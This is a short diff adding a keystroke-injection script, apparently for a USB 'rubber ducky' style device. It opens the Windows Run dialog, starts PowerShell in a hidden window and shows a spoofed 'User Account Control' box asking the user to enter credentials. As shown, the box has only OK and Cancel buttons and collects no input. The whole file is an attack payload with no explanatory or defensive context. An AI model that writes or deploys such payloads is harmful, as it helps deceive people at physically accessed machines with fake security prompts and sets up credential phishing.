@@ -1,0 +1,7 @@
+REM Fake UAC prompt using PowerShell
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command ^
+"Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('User Account Control needs your permission to continue. Enter your credentials to proceed.', 'User Account Control', 'OKCancel', 'Warning')"
+ENTER
